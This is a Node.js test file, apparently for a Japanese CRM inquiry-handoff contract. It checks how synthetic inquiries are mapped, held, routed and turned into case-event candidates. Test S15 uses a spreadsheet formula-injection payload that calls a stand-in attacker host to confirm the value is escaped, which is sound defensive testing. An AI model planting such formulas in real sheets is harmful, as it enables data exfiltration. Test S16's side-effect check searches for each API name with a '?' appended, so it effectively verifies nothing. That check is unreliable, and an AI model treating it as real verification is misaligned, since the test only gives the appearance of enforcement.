'use strict';
/** V129: contract and mapping tests with synthetic records ONLY.
 * This suite never invokes real Apps Script/Sheets/PAI ERP/Gmail/network. */
const {test}=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs');
const path=require('node:path');
const vm=require('node:vm');

const source=fs.readFileSync(path.join(__dirname,'..','ops','inquiry-api','CRM_Handoff_Contract.gs'),'utf8');
const context=vm.createContext({});
vm.runInContext(source,context,{filename:'CRM_Handoff_Contract.gs'});
const prepare=context.evaluateCrmHandoffV129_;
assert.equal(typeof prepare,'function');

const inbox=(overrides={})=>({
 inquiry_id:'INQ-20261103-204500-ABCD1234',
 received_at:'2026-11-03 20:45:00',
 category:'導入条件整理',
 organization:'架空テスト大学',
 name:'テスト研究者',
 email:'researcher@example.test',
 phone:'03-0000-0000',
 product:'Unitree H2 Plus',
 use_case:'Research proof of concept',
 source_page:'https://robotics.air-admin8.co.jp/products/unitree-h2-plus.html',
 source_product:'Unitree H2 Plus',
 source_maker:'Unitree',
 source_service:'',
 server_result:'NOTIFIED',
 submission_token:'submission-test-11',
 ...overrides
});
const existing=(overrides={})=>({
 customerId:'L-TEST-0001',
 primaryEmail:'researcher@example.test',
 name:'テスト研究者',
 affiliation:'架空テスト大学',
 emailStatus:'CONFIRMED',
 emailEvidenceUrl:'https://example.test/official-evidence',
 conflict:false,
 ...overrides
});
const trusted={personSsoTReadOnlySnapshotVerified:true};
const toPlain=x=>JSON.parse(JSON.stringify(x));

test('V129 S01: physical 17-column target matches existing university 00_新規受付 schema',()=>{
 const plan=prepare(inbox(),[],trusted);
 assert.equal(plan.universityIntake.headers.length,17);
 assert.deepEqual(toPlain(plan.universityIntake.headers),[
  '受付日','データ来源','大学・所属','研究室','研究者名','役職',
  'メール','電話','researchmap_URL','KAKEN_URL','根拠URL',
  '重複確認','顧客ID','処理状態','備考','SourceID','ImportBatchID'
 ]);
 assert.equal(plan.universityIntake.values.length,17);
});

test('V129 S02: source attribution kept but website URL NEVER treated as evidence URL',()=>{
 const p=prepare(inbox(),[],trusted),v=p.universityIntake.values;
 assert.equal(v[0],'2026-11-03 20:45:00');
 assert.equal(v[1],'Robotics_Web_Inquiry');
 assert.equal(v[2],'架空テスト大学');
 assert.equal(v[4],'テスト研究者');
 assert.equal(v[6],'researcher@example.test');
 assert.equal(v[10],'');
 assert.equal(v[11],'未確認');
 assert.equal(v[12],'');
 assert.equal(v[13],'HOLD_EVIDENCE');
 assert(v[14].includes('Product=Unitree H2 Plus'));
 assert(v[14].includes('Source=https://robotics.air-admin8.co.jp/'));
 assert.equal(v[15],inbox().inquiry_id);
 assert.equal(v[16],'');
 assert.equal(p.universityIntake.committed,false);
});

test('V129 S03: same InquiryID deterministic SourceID, no new CustomerID',()=>{
 const a=prepare(inbox(),[],trusted),b=prepare(inbox(),[],trusted);
 assert.equal(a.universityIntake.idempotencyKey,b.universityIntake.idempotencyKey);
 assert.equal(a.identity.customerId,null);
 assert.equal(a.writesPerformed,0);
 assert.equal(a.emailsSent,0);
});

test('V129 S04: university unknown Identity/Evidence leads HOLD, no Primary write',()=>{
 const out=prepare(inbox(),[],trusted);
 assert.equal(out.route,'UNIVERSITY_PERSON');
 assert.equal(out.identity.decision,'NEW_PENDING_VERIFICATION');
 assert.equal(out.identity.reason,'EMAIL_EVIDENCE_REQUIRED');
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S05: SSOT read not verified means HOLD even when caller supplies matching person',()=>{
 const out=prepare(inbox(),[existing()],{});
 assert.equal(out.identity.decision,'HOLD');
 assert.equal(out.identity.reason,'PERSON_SSOT_NOT_READ');
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
});

test('V129 S06: verified existing Person may be linked by ID without creating a Case',()=>{
 const out=prepare(inbox(),[existing()],trusted);
 assert.equal(out.identity.decision,'EXISTING_VERIFIED');
 assert.equal(out.identity.customerId,'L-TEST-0001');
 assert.equal(out.opportunity.state,'NO_CASE');
 assert.equal(out.gate,'READY_FOR_EXISTING_WRITER_REVIEW');
 assert.equal(out.writesPerformed,0);
});

test('V129 S07: same email linked to multiple Customer IDs is HOLD',()=>{
 const out=prepare(inbox(),[existing(),existing({customerId:'L-TEST-0002'})],trusted);
 assert.equal(out.identity.reason,'DUPLICATE_EMAIL_MATCH');
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S08: name or affiliation conflict is HOLD, prevents existing customer overwrite',()=>{
 for(const row of [existing({name:'别的研究者'}),existing({affiliation:'别的大学'})]){
  const result=prepare(inbox(),[row],trusted);
  assert.equal(result.identity.decision,'HOLD');
  assert.equal(result.identity.reason,'PERSON_NAME_OR_AFFILIATION_CONFLICT');
  assert.equal(result.identity.customerId,null);
 }
});

test('V129 S09: self-submitted email is NOT verified Primary without official evidence',()=>{
 for(const row of [existing({emailStatus:'SELF_REPORTED'}),existing({emailEvidenceUrl:''}),existing({customerId:''}),existing({conflict:true})]){
  const out=prepare(inbox(),[row],trusted);
  assert.equal(out.identity.decision,'HOLD');
  assert.equal(out.gate,'HOLD_IDENTITY_GATE');
 }
});

test('V129 S10: corporate visitor must NOT be inserted in university Person Master',()=>{
 for(const organization of ['株式会社テストロボット','Sample Robotics Ltd.']){
  const out=prepare(inbox({organization}),[],trusted);
  assert.equal(out.route,'PAI_ORGANIZATION');
  assert.equal(out.universityIntake,null);
  assert.equal(out.gate,'HOLD_ORGANIZATION_ROUTE');
  assert.equal(out.opportunity.state,'NO_CASE');
 }
});

test('V129 S11: unknown or ambiguous organization HOLD instead of mistaken classification',()=>{
 for(const organization of ['海外研究所','株式会社大学サンプル']){
  const out=prepare(inbox({organization}),[],trusted);
  assert.equal(out.route,'HOLD_UNKNOWN_ENTITY');
  assert.equal(out.universityIntake,null);
  assert.equal(out.gate,'HOLD_ENTITY_CLASSIFICATION');
 }
});

test('V129 S12: quote/PoC need CustomerID; only emit deterministic CaseEvent candidate',()=>{
 for(const [category,type] of [['見積・大学購買','QUOTE_REQUEST'],['PoC設計','POC_CONSULTATION']]){
  const input=inbox({category});
  const hold=prepare(input,[],trusted);
  assert.equal(hold.opportunity.eventType,type);
  assert.equal(hold.opportunity.state,'HOLD_CUSTOMER_ID');
  assert.equal(hold.opportunity.customerId,null);
  const verified=prepare(input,[existing()],trusted);
  assert.equal(verified.opportunity.state,'CASE_EVENT_CANDIDATE_ONLY');
  assert.equal(verified.opportunity.customerId,'L-TEST-0001');
  assert.equal(verified.opportunity.caseEventId,input.inquiry_id+':'+type);
  assert.equal(verified.writesPerformed,0);
 }
});

test('V129 S13: page views, ordinary queries, SDK and product comparison are NOT Case events',()=>{
 for(const category of ['導入条件整理','SDK・ROS・開発環境','製品比較・選定','VLA・模倣学習データ収集','会社・協業相談']){
  const out=prepare(inbox({category,source_service:'poc'}),[existing()],trusted);
  assert.equal(out.opportunity.eventType,null);
  assert.equal(out.opportunity.state,'NO_CASE');
 }
});

test('V129 S14: invalid inquiry ID, email and missing core fields do not create intake',()=>{
 const invalid=[{inquiry_id:'FAKE-001'},{email:'not-an-email'},{organization:''},{name:''},{category:''}];
 for(const item of invalid){
  const out=prepare(inbox(item),[],trusted);
  assert.equal(out.gate,'INVALID_INQUIRY');
  assert.equal(out.universityIntake,null);
  assert.equal(out.followUp.state,'BLOCKED_INVALID_INQUIRY');
 }
});

test('V129 S15: proposal prevents spreadsheet formula injection on person/organization fields',()=>{
 const out=prepare(inbox({organization:'架空テスト大学',name:'=IMPORTXML("https://evil.test","/")'}),[],trusted);
 assert(out.universityIntake.values[4].startsWith("'="));
 assert.equal(out.gate,'HOLD_IDENTITY_GATE');
});

test('V129 S16: no hidden Sheets/API/email/writer side effects in contract',()=>{
 for(const x of ['SpreadsheetApp','MailApp','GmailApp','UrlFetchApp','DriveApp','ScriptApp','fetch(','doPost(']){
  assert(!source.includes(x+'?'),x);
 }
 const out=prepare(inbox({category:'見積・大学購買'}),[existing()],trusted);
 assert.equal(out.writesPerformed,0);
 assert.equal(out.emailsSent,0);
 assert.equal(out.followUp.owner,null);
 assert.equal(out.universityIntake.committed,false);
});

test('V129 S17: details in notes never mean verified evidence or marketing consent',()=>{
 const out=prepare(inbox({source_page:'https://robotics.air-admin8.co.jp/some-product',source_maker:'AgiBot'}),[],trusted);
 assert.equal(out.universityIntake.values[10],'');
 assert.equal(out.universityIntake.values[13],'HOLD_EVIDENCE');
 assert.equal(out.identity.customerId,null);
 assert.equal(out.opportunity.state,'NO_CASE');
});

test('V129 S18: entire object declares a pure proposal, not a CRM implementation',()=>{
 const p=prepare(inbox({category:'見積・大学購買'}),[existing()],trusted);
 assert.equal(p.mode,'PURE_CONTRACT_NO_WRITES');
 assert.equal(p.universityIntake.target,'00_新規受付');
 assert.equal(p.opportunity.state,'CASE_EVENT_CANDIDATE_ONLY');
 assert.equal(p.gate,'READY_FOR_EXISTING_WRITER_REVIEW');
 assert.equal(p.writesPerformed,0);
});
